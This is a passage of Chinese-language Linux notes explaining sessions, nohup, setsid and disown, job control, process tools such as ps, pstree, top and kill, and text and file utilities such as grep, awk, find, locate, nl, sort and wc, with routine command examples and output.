关联的是伪终端，这个伪终端本身就是随着 session 的建立而创建的，session 结束，那么这个伪终端也会被销毁。\n\n如果 session 关联的是 tty1-6，tty 则不会被销毁。因为该终端设备是在系统初始化的时候创建的，并不是依赖该会话建立的，所以当 session 退出，tty 仍然存在。只是 init 系统在 session 结束后，会重启 getty 来监听这个 tty。\n\n### nohup\n如果我们在 session 中执行了 nohup 等类似的命令，当 session 消亡时，相关的进程并不会随着 session 结束，原因是这些进程不再受 SIGHUP 信号的影响。比如我们执行下面的命令：\n```bash\n$ nohup sleep 1000 >/dev/null 2>&1 & \n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425205922.png)\n\n此时 sleep 进程的 sid 和其它进程是相同的，还可以通过 pstree 命令看到进程间的父子关系：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425205939.png)\n\n如果我们退出当前 session 的领头进程(bash)，sleep 进程并不会退出，这样我们就可以放心的等待该进程运行结果了。\n\nnohup 并不改变进程的 sid，同时也说明在这种情况中，虽然 session 的领头进程退出了，但是 session 依然没有被销毁(至少 sid 还在被引用)。重新建立连接，通过下面的命令查看 sleep 进程的信息，发现进程的 sid 依然是 7837：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210005.png)\n\n但是此时的 sleep 已经被系统的 1 号进程 systemd 收养了：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210037.png)\n\n### setsid\nsetsid 会创建一个新的 session，它的目的是让进程在后台执行命令，实现方式就是让命令进程运行在一个新的与终端脱离的 session 中。看下面的示例：\n```bash\n$ setsid sleep 1000\n```\n查找之下居然没有发现 sleep 进程的踪迹：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210108.png)\n\n通过 grep 查询 sleep 进程的 PID：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210123.png)\n\n去查看 sleep 进程所在的 sid，发现是一个新的 session ID，并且没有关联终端：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210137.png)\n\n当一个进程通过调用 setsid 成为一个新的 session 领头进程时，它会与控制终端断开连接。\n\n此时通过 pstree 查看进程间的关系，发现 sleep 进程直接被系统的 1 号进程 systemd 收养了：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425210153.png)\n\n# 服务相关操作\n## service 命令\nservice 命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、重新加载配置（reload）、查看状态（status）等。不同的 Linux 发行版一般均会带有此命令，比如 RHEL、CentOS、SUSE、Ubuntu、Fedora 等。\nservice 命令是系统管理员命令，需要管理员权限才可以执行。service 命令本质上是一个 Shell 脚本，地址一般为 /sbin/service。\n**命令格式**\n```bash\nservice SCRIPT [start|stop|restart|status] [OPTIONS]\nservice --status-all\nservice --help | -h | --version\n```\nSCRIPT 表示管理服务的脚本，存放在 /etc/init.d/SCRIPT。服务脚本 SCRIPT 应该至少支持 start 命令和 stop 命令。\n**OPTIONS选项说明**\n```\n--status-all\n\t按字母顺序执行所有初始化脚本并传递 status 命令，显示所有的服务状态\n-h, --help\n\t显示帮助信息\n--version\n\t显示版本信息\n```\n**常用示例**\n1. 查看所有服务当前的运行状态。\n```bash\nservice --status-all\n```\n2. 将 MySQL 注册为系统服务，使用 service 命令管理。需要将MySQL的管理脚本mysql.server更名为mysqld放在 /etc/init.d/目录。\n```bash\n# 开启\nservice mysqld start\n\n# 关闭\nservice mysqld stop\n\n# 重启\nservice mysqld restart\n```\n\n# 进程相关操作\n## ctrl+z\nctrl + z可以将一个正在前台执行的命令放到后台，即前台进程的挂起\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213306.png)\n\n## ctrl+c\n前台进程的终止\n\n## &\n& 最经常被用到这个用在一个命令的最后，可以把这个命令放到后台执行\n\n## top\nLinux top命令用于实时显示 process 的动态。\n\n### 实例\n- 显示进程信息\n```bash\n# top\n```\n- 以累积模式显示程序信息\n```bash\n# top -S\n```\n- 设置信息更新次数\n```bash\n//表示更新两次后终止更新显示\ntop -n 2\n```\n- 设置信息更新时间\n```bash\n//表示更新周期为3秒\n# top -d 3\n```\n- 显示指定的进程信息\n```bash\n//显示进程号为139的进程信息，CPU、内存占用率等\n# top -p 139\n```\n- 显示更新十次后退出\n```bash\ntop -n 10\n```\n\n## jobs\njobs列出<font color=\"red\">当前shell环境</font>中已启动的任务状态，若未指定jobsid，则显示所有活动的任务状态信息；\njobs命令用于显示Linux中的任务列表及任务状态，包括后台运行的任务。该命令可以显示任务号及其对应的进程号。其中，任务号是以普通用户的角度进行的，而进程号则是从系统管理员的角度来看的。一个任务可以对应于一个或者多个进程号。\n\n参数：\n-l：显示进程号；\n-p：仅任务对应的显示进程号；\n-n：显示任务状态的变化；\n-r：仅输出运行状态（running）的任务；\n-s：仅输出停止状态（stoped）的任务。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213321.png)\n\n<font color=\"red\">注：</font> 切换到tmux的shell中的或是开启子shell， 然后再执行jobs命名会发现没有bin/spark-shell进程挂起， 这是因为jobs只列出的当前shell环境中的已启动的任务状态。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213335.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213350.png)\n\n## ps\n列出系统中正在运行的进程；\n\n不加参数执行ps命令：展示当前shell中运行的进程情况，很少使用。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213401.png)\n\n默认展示了4列信息：\nPID: 运行着的命令(CMD)的进程编号\nTTY: terminal type that the user is logged into \nTIME: 运行着的该命令所占用的CPU处理时间\nCMD: 该进程所运行的命令\n\nps常使用的参数：\n-A ：所有的进程均显示出来，与 -e 具有同样的效用；\n-a ：显示现行终端机下的所有进程，包括其他用户的进程；\n-u ：查看特定用户进程；\n由于输出的内容太多，ps一般使用情况是`ps aux | grep %要查询的东西%`, 注意，`aux`前没有`-`\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213411.png)\n\n## pstree\npstree shows running processes as a tree.  The tree is rooted at either pid or init if pid is omitted.  If a user name is specified, all process trees rooted at processes owned by that user are shown.\n\npstree visually merges identical branches by putting them in square brackets and prefixing them with the repetition count, e.g.\n```\n init-+-getty\n      |-getty\n      |-getty\n      `-getty\n```\nbecomes\n```\n init---4*[getty]\n```\nChild threads of a process are found under the parent process and are shown with the process name in curly braces, e.g.\n```\n icecast2---13*[{icecast2}]\n```\n\n例子：\n```bash\n#pstree  -up\n\nsystemd(1)-+-agetty(2021)\n           |-agetty(2022)\n           |-bash(23254,ffy)\n           |-chronyd(1180,chrony)\n           |-crond(1277)---crond(25734)---sogou-agent(25736)---sleep(25759)\n           |-dbus-daemon(1123,dbus)\n           \n           |-python(25707,dlj)-+-python(25778)-+-{python}(25781)\n           |                   |               |-{python}(25783)\n           |                   |               |-{python}(25784)\n           |                   |               |-{python}(27547)\n           |                   |               `-{python}(27548)\n           |                   |-python(25779)-+-{python}(25785)\n           |                   |               |-{python}(25786)\n           |                   |               `-{python}(25788)\n           |                   |-python(25780)-+-{python}(27549)\n           |                   |               |-{python}(27550)\n           |                   |               |-{python}(27551)\n           |                   |               |-{python}(27552)\n           |                   |               |-{python}(27553)\n           |                   |               |-{python}(27554)\n           |                   |               `-{python}(27555)\n           |                   |-python(25782)-+-{python}(29319)\n           |                   |               |-{python}(29320)\n           |                   |               |-{python}(29321)\n           |                   |               |-{python}(29322)\n           |                   |               |-{python}(29323)\n           |                   |               |-{python}(29324)\n           |                   |               `-{python}(29325)\n           |                   `-python(25787)\n           \n```\n- 可以看到所有的进程都是依附在systemd这个进程下面，它的进程PID是1，因为它是由Linux内核主动调用的一个进程。\n- 可以从中看出来进程所属的用户为dlj，每个进程的pid\n- 而且，25707这个进程有5个子进程，分别为25778,25779,25780,25782,25787\n- 25778这个进程也有几个子线程，分别为,25781，25783,25784,27547,27548\n\n## fg\nfg将后台中的命令调至前台继续运行如果后台中有多个命令，可以用`fg %jobnumber`将选中的命令调出， `%jobnumber`是通过jobs命令查到的后台正在执行的命令的序号(不是pid)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220406213425.png)\n\n## bg\nbg将一个在后台暂停的命令，变成继续执行， 即使一个进程在后台\n\n如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出，%jobnumber是通过jobs命令查到的后台正在执行的命令的序号(不是pid) \n\n## kill\nLinux kill 命令用于删除执行中的程序或工作。\n\nkill 可将指定的信息送至程序。预设的信息为 SIGTERM(15)，可将指定程序终止。若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 jobs 指令查看。\n\n### 实例\n- 杀死进程\n```bash\n# kill 12345\n```\n- 强制杀死进程\n```bash\n# kill -KILL 123456\n```\n- 发送SIGHUP信号，可以使用一下信号\n```bash\n# kill -HUP pid\n```\n- 彻底杀死进程\n```bash\n# kill -9 123456\n```\n- 显示信号\n```bash\n# kill -l\n1) SIGHUP     2) SIGINT     3) SIGQUIT     4) SIGILL     5) SIGTRAP\n6) SIGABRT     7) SIGBUS     8) SIGFPE     9) SIGKILL    10) SIGUSR1\n11) SIGSEGV    12) SIGUSR2    13) SIGPIPE    14) SIGALRM    15) SIGTERM\n16) SIGSTKFLT    17) SIGCHLD    18) SIGCONT    19) SIGSTOP    20) SIGTSTP\n21) SIGTTIN    22) SIGTTOU    23) SIGURG    24) SIGXCPU    25) SIGXFSZ\n26) SIGVTALRM    27) SIGPROF    28) SIGWINCH    29) SIGIO    30) SIGPWR\n31) SIGSYS    34) SIGRTMIN    35) SIGRTMIN+1    36) SIGRTMIN+2    37) SIGRTMIN+3\n38) SIGRTMIN+4    39) SIGRTMIN+5    40) SIGRTMIN+6    41) SIGRTMIN+7    42) SIGRTMIN+8\n43) SIGRTMIN+9    44) SIGRTMIN+10    45) SIGRTMIN+11    46) SIGRTMIN+12    47) SIGRTMIN+13\n48) SIGRTMIN+14    49) SIGRTMIN+15    50) SIGRTMAX-14    51) SIGRTMAX-13    52) SIGRTMAX-12\n53) SIGRTMAX-11    54) SIGRTMAX-10    55) SIGRTMAX-9    56) SIGRTMAX-8    57) SIGRTMAX-7\n58) SIGRTMAX-6    59) SIGRTMAX-5    60) SIGRTMAX-4    61) SIGRTMAX-3    62) SIGRTMAX-2\n63) SIGRTMAX-1    64) SIGRTMAX\n```\n- 杀死指定用户所有进程\n```bash\n#kill -9 $(ps -ef | grep hnlinux) //方法一 过滤出hnlinux用户进程 \n#kill -u hnlinux //方法二\n```\n\n## Linux让进程（正在运行）在后台运行：nohup/&//setid/disown/\n咱们常常会碰到这样的问题，用 telnet/ssh 登陆了远程的 Linux 服务器，运行了一些耗时较长的任务， 结果却因为网络的不稳定致使任务中途失败。如何让命令提交后不受本地关闭终端窗口/网络断开链接的干扰呢？下面举了一些例子， 您能够针对不一样的场景选择不一样的方式来处理这个问题。\n\n若是只是临时有一个命令须要长时间运行，什么方法能最简便的保证它在后台稳定运行呢？\n\n> hangup 名称的来由\n> 在 Unix 的早期版本中，每一个终端都会经过 modem 和系统通信。当用户 logout 时，modem 就会挂断（hang up）电话。 同理，当 modem 断开链接时，就会给终端发送 hangup 信号来通知其关闭全部子进程。\n\n咱们知道，当用户注销（logout）或者网络断开时，终端会收到 HUP（hangup）信号从而关闭其全部子进程。所以，咱们的解决办法就有两种途径：要么让进程忽略 HUP 信号，要么让进程运行在新的会话里从而成为不属于此终端的子进程。\n\n### nohup\nnohup 无疑是咱们首先想到的办法。顾名思义，nohup 的用途就是让提交的命令忽略 hangup 信号。让咱们先来看一下 nohup 的帮助信息\n```\nNOHUP(1)                        User Commands                        NOHUP(1)\n\nNAME\n       nohup - run a command immune to hangups, with output to a non-tty\n\nSYNOPSIS\n       nohup COMMAND [ARG]...\n       nohup OPTION\n\nDESCRIPTION\n       Run COMMAND, ignoring hangup signals.\n\n       --help display this help and exit\n\n       --version\n              output version information and exit\n```\n可见，nohup 的使用是十分方便的，只需在要处理的命令前加上 nohup 便可，标准输出和标准错误缺省会被重定向到 nohup.out 文件中。通常咱们可在结尾加上”&”来将命令同时放入后台运行，也可用`>filename 2>&1`来更改缺省的重定向文件名。\n\nnohup 示例\n```bash\n[root@pvcent107 ~]# nohup ping www.ibm.com &\n[1] 3059\nnohup: appending output to `nohup.out'\n[root@pvcent107 ~]# ps -ef |grep 3059\nroot      3059   984  0 21:06 pts/3    00:00:00 ping www.ibm.com\nroot      3067   984  0 21:06 pts/3    00:00:00 grep 3059\n[root@pvcent107 ~]#\n```\n\n### setsid\nnohup 无疑能经过忽略 HUP 信号来使咱们的进程避免中途被中断，但若是咱们换个角度思考，若是咱们的进程不属于接受 HUP 信号的终端的子进程，那么天然也就不会受到 HUP 信号的影响了。setsid 就能帮助咱们作到这一点。让咱们先来看一下 setsid 的帮助信息：\n```\nSETSID(8)                 Linux Programmer’s Manual                 SETSID(8)\n\nNAME\n       setsid - run a program in a new session\n\nSYNOPSIS\n       setsid program [ arg ... ]\n\nDESCRIPTION\n       setsid runs a program in a new session.\n```\n可见 setsid 的使用也是很是方便的，也只需在要处理的命令前加上 setsid 便可\n\nsetsid 示例\n```bash\n[root@pvcent107 ~]# setsid ping www.ibm.com\n[root@pvcent107 ~]# ps -ef |grep www.ibm.com\nroot     31094     1  0 07:28 ?        00:00:00 ping www.ibm.com\nroot     31102 29217  0 07:29 pts/4    00:00:00 grep www.ibm.com\n[root@pvcent107 ~]#\n```\n\n值得注意的是，上例中咱们的进程 ID(PID)为31094，而它的父 ID（PPID）为1（即为 init 进程 ID），并非当前终端的进程 ID。请将此例与nohup 例中的父 ID 作比较。\n\n### &\n这里还有一个关于 subshell 的小技巧。咱们知道，将一个或多个命名包含在`()`中就能让这些命令在子 shell 中运行中，从而扩展出不少有趣的功能，咱们如今要讨论的就是其中之一。\n\n当咱们将`&`也放入`()`内以后，咱们就会发现所提交的做业并不在做业列表中，也就是说，是没法经过jobs来查看的。让咱们来看看为何这样就能躲过 HUP 信号的影响吧。\n\nsubshell 示例\n```bash\n[root@pvcent107 ~]# (ping www.ibm.com &)\n[root@pvcent107 ~]# ps -ef |grep www.ibm.com\nroot     16270     1  0 14:13 pts/4    00:00:00 ping www.ibm.com\nroot     16278 15362  0 14:13 pts/4    00:00:00 grep www.ibm.com\n[root@pvcent107 ~]#\n```\n\n从上例中能够看出，新提交的进程的父 ID（PPID）为1（init 进程的 PID），并非当前终端的进程 ID。所以并不属于当前终端的子进程，从而也就不会受到当前终端的 HUP 信号的影响了\n\n### disown\n咱们已经知道，若是事先在命令前加上 nohup 或者 setsid 就能够避免 HUP 信号的影响。可是若是咱们未加任何处理就已经提交了命令，该如何补救才能让它避免 HUP 信号的影响呢？\n\n这时想加 nohup 或者 setsid 已经为时已晚，只能经过做业调度和 disown 来解决这个问题了。让咱们来看一下 disown 的帮助信息：\n```\ndisown [-ar] [-h] [jobspec ...]\n    Without options, each jobspec is  removed  from  the  table  of\n    active  jobs.   If  the -h option is given, each jobspec is not\n    removed from the table, but is marked so  that  SIGHUP  is  not\n    sent  to the job if the shell receives a SIGHUP.  If no jobspec\n    is present, and neither the -a nor the -r option  is  supplied,\n    the  current  job  is  used.  If no jobspec is supplied, the -a\n    option means to remove or mark all jobs; the -r option  without\n    a  jobspec  argument  restricts operation to running jobs.  The\n return value is 0 unless a jobspec does  not  specify  a  valid\n    job.\n```\n能够看出，咱们能够用以下方式来达成咱们的目的。 \n\n**灵活运用 CTRL-z**\n\n在咱们的平常工做中，咱们能够用 CTRL-z 来将当前进程挂起到后台暂停运行，执行一些别的操做，而后再用 fg 来将挂起的进程从新放回前台（也可用 bg 来将挂起的进程放在后台）继续运行。这样咱们就能够在一个终端内灵活切换运行多个任务，这一点在调试代码时尤其有用。由于将代码编辑器挂起到后台再从新放回时，光标定位仍然停留在上次挂起时的位置，避免了从新定位的麻烦。\n\n- 用disown -h jobspec来使某个做业忽略HUP信号。\n- 用disown -ah 来使全部的做业都忽略HUP信号。\n- 用disown -rh 来使正在运行的做业忽略HUP信号。\n\n须要注意的是，当使用过 disown 以后，会将把目标做业从做业列表中移除，咱们将不能再使用jobs来查看它，可是依然可以用ps -ef查找到它。\n\n可是还有一个问题，这种方法的操做对象是做业，若是咱们在运行命令时在结尾加了”&”来使它成为一个做业并在后台运行，那么就万事大吉了，咱们能够经过jobs命令来获得全部做业的列表。可是若是并无把当前命令做为做业来运行，如何才能获得它的做业号呢？答案就是用 CTRL-z（按住Ctrl键的同时按住z键）了！\n\nCTRL-z 的用途就是将当前进程挂起（Suspend），而后咱们就能够用jobs命令来查询它的做业号，再用bg jobspec来将它放入后台并继续运行。须要注意的是，若是挂起会影响当前进程的运行结果，请慎用此方法。\n\ndisown 示例1（若是提交命令时已经用“&”将命令放入后台运行，则能够直接使用“disown”）\n```bash\n[root@pvcent107 build]# cp -r testLargeFile largeFile &\n[1] 4825\n[root@pvcent107 build]# jobs\n[1]+  Running                 cp -i -r testLargeFile largeFile &\n[root@pvcent107 build]# disown -h %1\n[root@pvcent107 build]# ps -ef |grep largeFile\nroot      4825   968  1 09:46 pts/4    00:00:00 cp -i -r testLargeFile largeFile\nroot      4853   968  0 09:46 pts/4    00:00:00 grep largeFile\n[root@pvcent107 build]# logout\n```\n\ndisown 示例2（若是提交命令时未使用“&”将命令放入后台运行，可以使用 CTRL-z 和“bg”将其放入后台，再使用“disown”）\n```bash\n[root@pvcent107 build]# cp -r testLargeFile largeFile2\n\n[1]+  Stopped                 cp -i -r testLargeFile largeFile2\n[root@pvcent107 build]# bg %1\n[1]+ cp -i -r testLargeFile largeFile2 &\n[root@pvcent107 build]# jobs\n[1]+  Running                 cp -i -r testLargeFile largeFile2 &\n[root@pvcent107 build]# disown -h %1\n[root@pvcent107 build]# ps -ef |grep largeFile2\nroot      5790  5577  1 10:04 pts/3    00:00:00 cp -i -r testLargeFile largeFile2\nroot      5824  5577  0 10:05 pts/3    00:00:00 grep largeFile2\n[root@pvcent107 build]#\n```\n\n# 文件相关操作\n## grep\nLinux grep 命令用于查找文件里符合条件的字符串。\n\ngrep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。\n\n### 实例\n1. 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：\n```bash\ngrep test *file \n```\n结果如下所示：\n```bash\n$ grep test test* #查找前缀有“test”的文件包含“test”字符串的文件  \ntestfile1:This a Linux testfile! #列出testfile1 文件中包含test字符的行  \ntestfile_2:This is a linux testfile! #列出testfile_2 文件中包含test字符的行  \ntestfile_2:Linux test #列出testfile_2 文件中包含test字符的行 \n```\n\n2. 以递归的方式查找符合条件的文件。例如，查找指定目录/etc/acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串\"update\"的文件，并打印出该字符串所在行的内容，使用的命令为：\n```bash\ngrep -r update /etc/acpi \n```\n输出结果如下：\n```bash\n$ grep -r update /etc/acpi #以递归的方式查找“etc/acpi”  \n#下包含“update”的文件  \n/etc/acpi/ac.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of IO.)  \nRather than  \n/etc/acpi/resume.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of  \nIO.) Rather than  \n/etc/acpi/events/thinkpad-cmos:action=/usr/sbin/thinkpad-keys--update \n```\n\n3. 反向查找。前面各个例子是查找并打印出符合条件的行，通过\"-v\"参数可以打印出不符合条件行的内容。\n查找文件名中包含 test 的文件中不包含test 的行，此时，使用的命令为：\n```bash\ngrep -v test *test*\n```\n结果如下所示：\n```bash\n$ grep-v test* #查找文件名中包含test 的文件中不包含test 的行  \ntestfile1:helLinux!  \ntestfile1:Linis a free Unix-type operating system.  \ntestfile1:Lin  \ntestfile_1:HELLO LINUX!  \ntestfile_1:LINUX IS A FREE UNIX-TYPE OPTERATING SYSTEM.  \ntestfile_1:THIS IS A LINUX TESTFILE!  \ntestfile_2:HELLO LINUX!  \ntestfile_2:Linux is a free unix-type opterating system.  \n```\n\n## ag命令\nAg 是类似ack， grep的工具, 它来在文件中搜索相应关键字。\n\n```bash\n#在当前目录下寻找内容包含\"小明\"的文件，并列出所在的行数:\nag 小明\n\n#在指定目录中寻找内容包含\"foo\"的文件:\nag foo [指定目录] \n\n#在当前目录下寻找内容包含\"foo\"的文件，但只列出文件名:\nag -l foo\n\n#忽略大小写，寻找内容包含\"ABC\"的文件，并只输出匹配的内容，而非整行:\nag -i -o ABC\n\n#在文件名包含\"小红\"的文件中寻找\"小明\":\nag 小明 -G 小红\n\n#使用正则表达式来匹配文件内容:\nag '{{^ba(r|z)$}}'\n\n#输出文件名包含\"小明\"的文件名:\nag -g 小明\n```\n\n## awk命令\nAWK 是一种处理文本文件的语言，是一个强大的文本分析工具。\n\n### 实例\nlog.txt文本内容如下：\n```txt\n2 this is a test\n3 Are you like awk\nThis's a test\n10 There are orange,apple,mongo\n```\n\n#### 用法一\n```bash\nawk '{[pattern] action}' {filenames}   # 行匹配语句 awk '' 只能用单引号\n```\n实例：\n```bash\n# 每行按空格或TAB分割，输出文本中的1、4项\n $ awk '{print $1,$4}' log.txt\n ---------------------------------------------\n 2 a\n 3 like\n This's\n 10 orange,apple,mongo\n # 格式化输出\n $ awk '{printf \"%-8s %-10s\\n\",$1,$4}' log.txt\n ---------------------------------------------\n 2        a\n 3        like\n This's\n 10       orange,apple,mongo\n``` \n\n#### 用法二：\n```bash\nawk -F  #-F相当于内置变量FS, 指定分割字符\n```\n实例：\n```bash\n# 使用\",\"分割\n $  awk -F, '{print $1,$2}'   log.txt\n ---------------------------------------------\n 2 this is a test\n 3 Are you like awk\n This's a test\n 10 There are orange apple\n # 或者使用内建变量\n $ awk 'BEGIN{FS=\",\"} {print $1,$2}'     log.txt\n ---------------------------------------------\n 2 this is a test\n 3 Are you like awk\n This's a test\n 10 There are orange apple\n # 使用多个分隔符.先使用空格分割，然后对分割结果再使用\",\"分割\n $ awk -F '[ ,]'  '{print $1,$2,$5}'   log.txt\n ---------------------------------------------\n 2 this test\n 3 Are awk\n This's a\n 10 There apple\n```\n\n#### 用法三：\n```bash\nawk -v  # 设置变量\n```\n实例：\n```bash\n $ awk -va=1 '{print $1,$1+a}' log.txt\n ---------------------------------------------\n 2 3\n 3 4\n This's 1\n 10 11\n $ awk -va=1 -vb=s '{print $1,$1+a,$1b}' log.txt\n ---------------------------------------------\n 2 3 2s\n 3 4 3s\n This's 1 This'ss\n 10 11 10s\n```\n\n## sed命令\nLinux sed 命令是利用脚本来处理文本文件。\n\nsed 可依照脚本的指令来处理、编辑文本文件。Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。\n\n\n\n\n## find\nLinux find 命令用来在指定目录下查找文件。\n\n任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。\n\n### 实例\n1. 将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:\n```bash\n# find . -name \"*.c\"\n```\n\n2. 将当前目录及其子目录中的所有文件列出：\n```bash\n# find . -type f\n```\n\n3. 将当前目录及其子目录下所有最近 20 天内更新过的文件列出:\n```bash\n# find . -ctime -20\n```\n\n4. 查找 /var/log 目录中更改时间在 7 日以前的普通文件，并在删除之前询问它们：\n```bash\n# find /var/log -type f -mtime +7 -ok rm {} \\;\n```\n\n5. 查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：\n```bash\n# find . -type f -perm 644 -exec ls -l {} \\;\n```\n\n6. 查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径：\n```bash\n# find / -type f -size 0 -exec ls -l {} \\;\n```\n\n## which\nLinux which命令用于查找文件。\n\nwhich指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n\n### 实例\n使用指令\"which\"查看指令\"bash\"的绝对路径，输入如下命令：\n```bash\n$ which bash\n```\n上面的指令执行后，输出信息如下所示：\n```bash\n/bin/bash                   #bash可执行程序的绝对路径 \n```\n\n## whereis\nwhereis命令 用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。\n\n和find相比，whereis查找的速度非常快，这是因为linux系统会将 系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通 过遍历硬盘来查找，效率自然会很高。 但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。\n\n### 语法\n```bash\nwhereis(选项)(参数)\n```\n\n- -b：只查找二进制文件；\n- -B<目录>：只在设置的目录下查找二进制文件；\n- -f：不显示文件名前的路径名称；\n- -m：只查找说明文件；\n- -M<目录>：只在设置的目录下查找说明文件；\n- -s：只查找原始代码文件；\n- -S<目录>只在设置的目录下查找原始代码文件；\n- -u：查找不包含指定类型的文件。\n\n参数：要查找的二进制程序、源文件和man手册页的指令名。\n\n### 实例\n将相关的文件都查找出来\n```bash\n[root@localhost ~]# whereis tomcat\ntomcat:\n\n[root@localhost ~]# whereis svn\nsvn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz\n```\n说明：tomcat没安装，找不出来，svn安装找出了很多相关文件\n\n只将二进制文件查找出来 \n```bash\n[root@localhost ~]# whereis -b svn\nsvn: /usr/bin/svn /usr/local/svn\n\n[root@localhost ~]# whereis -m svn\nsvn: /usr/share/man/man1/svn.1.gz\n\n[root@localhost ~]# whereis -s svn\nsvn:\n```\n说明：whereis -m svn查出说明文档路径，whereis -s svn找source源文件。\n\n## locate命令\nLinux locate命令用于查找符合条件的文档，他会去保存文档和目录名称的数据库内，查找合乎范本样式条件的文档或目录。\n\n一般情况我们只需要输入 locate your_file_name 即可查找指定文件。\n\n### 实例\n查找 passwd 文件，输入以下命令：\n```bash\nlocate passwd\n```\n搜索 etc 目录下所有以 sh 开头的文件 ：\n```bash\nlocate /etc/sh\n```\n忽略大小写搜索当前用户目录下所有以 r 开头的文件 ：\n```bash\nlocate -i ~/r\n```\n\n### 附加说明\n- locate 与 find 不同: find 是去硬盘找，locate 只在 /var/lib/slocate 资料库中找。\n- locate 的速度比 find 快，它并不是真的查找，而是查数据库，一般文件数据库在 /var/lib/slocate/slocate.db 中，所以 locate 的查找并不是实时的，而是以数据库的更新为准，一般是系统自己维护，也可以手工升级数据库 ，命令为：\n```bash\nupdatedb\n```\n\n## nl\nnl命令在linux系统中用来计算文件中行号。\n\nnl可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。\n\n### 实例\n1. 实例一用 nl 列出 log.log 的内容命令：\n```bash\n[yiibai@localhost test]$ cat log.log\nthis is line 1.\nthis is line 2.\nthis is line 3.\nthis is line 4.\n\nthis is line 5.\n\n-----------------end\n[yiibai@localhost test]$ nl log.log\n     1  this is line 1.\n     2  this is line 2.\n     3  this is line 3.\n     4  this is line 4.\n\n     5  this is line 5.\n\n     6  -----------------end\n[yiibai@localhost test]$\n```\n说明：文件中的空白行，nl 不会加上行号。\n\n2. 实例二用 nl 列出 log.log 的内容，空本行也加上行号。命令：\n```bash\n[yiibai@localhost test]$ nl -b a log.log\n     1  this is line 1.\n     2  this is line 2.\n     3  this is line 3.\n     4  this is line 4.\n     5\n     6  this is line 5.\n     7\n     8  -----------------end\n[yiibai@localhost test]$\n```\n\n3. 实例三让行号前面自动补上0,统一输出格式。\n```bash\n[yiibai@localhost test]$ nl -b a -n rz log.log\n000001  this is line 1.\n000002  this is line 2.\n000003  this is line 3.\n000004  this is line 4.\n000005\n000006  this is line 5.\n000007\n000008  -----------------end\n[yiibai@localhost test]$ nl -b a -n rz -w 3 log.log\n001     this is line 1.\n002     this is line 2.\n003     this is line 3.\n004     this is line 4.\n005\n006     this is line 5.\n007\n008     -----------------end\n[yiibai@localhost test]$\n```\n说明：nl -b a -n rz 命令行号默认为六位，要调整位数可以加上参数 -w 3 调整为3位。\n\n## sort\nLinux sort 命令用于将文本文件内容加以排序。\n\nsort 可针对文本文件的内容，以行为单位来排序。\n\n### 实例\n在使用 sort 命令以默认的式对文件的行进行排序，使用的命令如下：\n```bash\nsort testfile \n```\nsort 命令将以默认的方式将文本文件的第一列以 ASCII 码的次序排列，并将结果输出到标准输出。\n\n使用 cat 命令显示 testfile 文件可知其原有的排序如下：\n```bash\n$ cat testfile      # testfile文件原有排序  \ntest 30  \nHello 95  \nLinux 85 \n```\n使用 sort 命令重排后的结果如下：\n```bash\n$ sort testfile # 重排结果  \nHello 95  \nLinux 85  \ntest 30 \n```\n使用 -k 参数设置对第二列的值进行重排，结果如下：\n```bash\n$ sort testfile -k 2\ntest 30  \nLinux 85 \nHello 95  \n```\n\n## wc命令\nLinux wc命令用于计算字数。\n\n利用wc指令我们可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为\"-\"，则wc指令会从标准输入设备读取数据。\n\n### 实例\n在默认的情况下，wc将计算指定文件的行数、字数，以及字节数。使用的命令为：\n```bash\nwc testfile \n```\n先查看testfile文件的内容，可以看到：\n```bash\n$ cat testfile  \nLinux networks are becoming more and more common, but scurity is often an overlooked  \nissue. Unfortunately, in today’s environment all networks are potential hacker targets,  \nfro0m tp-secret military research networks to small home LANs.  \nLinux Network Securty focuses on securing Linux in a networked environment, where the  \nsecurity of the entire network needs to be considered rather than just isolated machines.  \nIt uses a mix of theory and practicl techniques to teach administrators how to 